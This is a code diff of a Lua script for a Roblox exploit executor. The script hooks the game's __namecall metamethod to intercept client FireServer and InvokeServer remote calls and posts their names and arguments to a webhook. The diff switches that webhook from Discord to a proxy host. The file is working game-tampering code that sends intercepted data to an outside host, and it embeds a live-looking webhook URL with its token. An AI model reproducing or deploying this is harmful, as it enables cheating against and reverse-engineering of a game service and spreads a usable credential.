@@ -1,46 +1,40 @@
--- [[ WEBHOOK ]]
-local url = "https://discord.com/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
-
--- [[ DELTA COMPATIBILITY CHECK ]]
-local requestFunc = request or http_request or (http and http.request)
+-- Line 1
+local WH = "https://hooks.hyra.io/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
+local http = (request or http_request or (http and http.request))
 local hook = hookmetamethod
 
-if not requestFunc then print("FATAL: No request function found") return end
-if not hook then print("FATAL: No hookmetamethod found") return end
+if not http or not hook then 
+    print("Device not supported") 
+    return 
+end
 
--- [[ THE SEND FUNCTION ]]
-local function post(name, msg)
-    local payload = {
-        Url = url,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode({
-            ["content"] = "🚩 **Remote:** " .. name .. "\n**Data:** " .. tostring(msg)
-        })
-    }
-    -- Run in background so it doesn't freeze your game
+local function send(name, info)
+    local payload = game:GetService("HttpService"):JSONEncode({
+        ["content"] = "Captured: " .. tostring(name) .. " | Data: " .. tostring(info)
+    })
+    
     task.spawn(function()
-        requestFunc(payload)
+        http({
+            Url = WH,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
     end)
 end
 
--- [[ IMMEDIATE START TEST ]]
-print("Testing Webhook...")
-post("STARTUP_CHECK", "Delta Logger is running!")
+-- Test immediately
+print("Script Started")
+send("TEST_BOOT", "Success")
 
--- [[ THE HOOK ]]
 local old
 old = hook(game, "__namecall", function(self, ...)
     local method = getnamecallmethod()
     local args = {...}
-
+    
     if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
-        -- We only log the FIRST argument to keep it simple and avoid errors
-        local data = args[1]
-        post(tostring(self.Name), tostring(data))
+        task.spawn(send, self.Name, args[1])
     end
-
+    
     return old(self, ...)
 end)
-
-print("✅ Hook is locked in. Go press a button in-game!")
